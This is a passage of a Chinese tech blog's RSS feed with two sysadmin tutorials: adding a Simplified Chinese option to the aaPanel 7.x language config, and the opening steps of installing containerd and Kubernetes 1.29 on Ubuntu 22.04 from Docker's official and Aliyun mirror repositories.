      <description>aapanel 7.x 中文语言配置指南 准备工作 1. 版本要求 ✅ 官方支持版本：7.0.10+ 2. 配置文件路径 配置步骤 1. 备份配置文件 2. 编辑配置文件 3. 添加中文配置 在languages数组首项插入： 4. 重启面板服务 全文参考</description>
      <pubDate>Tue, 04 Mar 2025 02:03:09 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>准备工作</h2>
<h3>1. 版本要求</h3>
<p>✅ 官方支持版本：7.0.10+</p>
<h3>2. 配置文件路径</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/www/server/panel/BTPanel/languages/settings.json</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>配置步骤</h2>
<h3>1. 备份配置文件</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">cp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /www/server/panel/BTPanel/languages/settings.json{,.bak}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>2. 编辑配置文件</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /www/server/panel/BTPanel/languages/settings.json</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>3. 添加中文配置</h3>
<p>在<code>languages</code>数组首项插入：</p>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "languages"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "name"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"zh"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "google"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"zh"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "title"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\u7b80\u4f53\u4e2d\u6587</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\u7b80\u4f53\u4e2d\u6587</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        },</span></span>
<span class="line"><span style="--shiki-light:white;--shiki-dark:#FFFFFF">      ...</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">      ]</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>4. 重启面板服务</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>全文参考</h2>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">cat /www/server/panel/BTPanel/languages/settings.json</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "default"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"zh"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">    "languages"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "name"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"zh"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "google"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"zh"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "title"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\u7b80\u4f53\u4e2d\u6587</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\u7b80\u4f53\u4e2d\u6587</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        },</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "name"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"cht"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "google"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"zh-tw"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "title"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\u7e41\u9ad4\u4e2d\u6587</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\u7e41\u9ad4\u4e2d\u6587</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        },</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "name"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"en"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "google"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"en"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "title"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"English"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\u82f1\u8bed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        },</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "name"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"de"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "google"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"de"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "title"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Deutsch"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\u5fb7\u8bed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        },</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "name"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"fra"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "google"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"fr"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "title"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Fran</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\u00e7</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ais"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\u6cd5\u8bed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        },</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "name"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"spa"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "google"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"es"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "title"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Espa</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\u00f1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ol"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\u897f\u73ed\u7259\u8bed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        },</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        {</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "name"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"pt"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "google"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"pt"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "title"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"Portugu</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\u00ea</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">s"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">            "cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\u8461\u8404\u7259\u8bed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    ]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Ubuntu 22 安装 Kubernetes 1.29 集群指南</title>
      <link>https://www.geekery.cn/note-book/Kubernetes/Ubuntu%2022%E5%AE%89%E8%A3%85Kubernetes%201.29.html</link>
      <guid>https://www.geekery.cn/note-book/Kubernetes/Ubuntu%2022%E5%AE%89%E8%A3%85Kubernetes%201.29.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Ubuntu 22 安装 Kubernetes 1.29 集群指南</source>
      <description>Ubuntu 22 安装 Kubernetes 1.29 集群指南 本文记录在 Ubuntu 22.04 系统上安装最新 Kubernetes 1.29 集群的完整过程，所有步骤均遵循官方文档操作规范 容器运行时安装 自 Kubernetes 1.20 版本起已弃用 Docker 支持，1.24 及后续版本完全移除了 Docker 依赖。容器运行时改用...</description>
      <pubDate>Wed, 19 Feb 2025 01:56:51 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>本文记录在 Ubuntu 22.04 系统上安装最新 Kubernetes 1.29 集群的完整过程，所有步骤均遵循官方文档操作规范</p>
</blockquote>
<h2>容器运行时安装</h2>
<p>自 Kubernetes 1.20 版本起已弃用 Docker 支持，1.24 及后续版本完全移除了 Docker 依赖。容器运行时改用 containerd（符合 OCI 规范的标准容器实现）。虽然 Docker 已被弃用，但 containerd 仍由 Docker 公司维护，可通过 Docker 官方渠道安装最新版本。注意：如需安装特定版本 Kubernetes，建议从 GitHub 下载对应版本的 containerd。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 安装基础依赖</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> update</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ca-certificates</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> curl</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 配置Docker官方GPG密钥</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -m</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0755</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/apt/keyrings</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -fsSL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://download.docker.com/linux/ubuntu/gpg</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/apt/keyrings/docker.asc</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a+r</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/apt/keyrings/docker.asc</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 添加Docker稳定版仓库</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "deb [arch=$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">dpkg</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --print-architecture</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">) signed-by=/etc/apt/keyrings/docker.asc] </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">https://download.docker.com/linux/ubuntu $(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/os-release &amp;&amp; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$VERSION_CODENAME</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">") stable"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tee</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/apt/sources.list.d/docker.list</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/dev/null</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 安装containerd运行时</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> update</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> containerd.io</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cri-tools</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>Kubernetes 核心组件安装</h3>
<p>Kubernetes 集群需要以下三个核心组件：</p>
<ul>
<li><strong>kubeadm</strong>：集群引导工具，负责集群组件的部署和初始化</li>
<li><strong>kubelet</strong>：节点代理服务，负责与控制平面通信并管理节点上的 Pod</li>
<li><strong>kubectl</strong>：集群管理命令行工具，用于与 Kubernetes API 交互</li>
</ul>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 安装基础依赖</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> update</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-transport-https</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 配置阿里云 Kubernetes 源</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -fsSL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://mirrors.aliyun.com/kubernetes-new/core/stable/v1.29/deb/Release.key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    gpg</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --dearmor</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/apt/keyrings/kubernetes-apt-keyring.gpg</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    </span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">https://mirrors.aliyun.com/kubernetes-new/core/stable/v1.29/deb/ /"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">\</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tee</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/apt/sources.list.d/kubernetes.list</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># 安装 Kubernetes 组件</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> update</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --allow-downgrades</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kubelet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kubeadm</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> kubectl</span></span></code></pre>
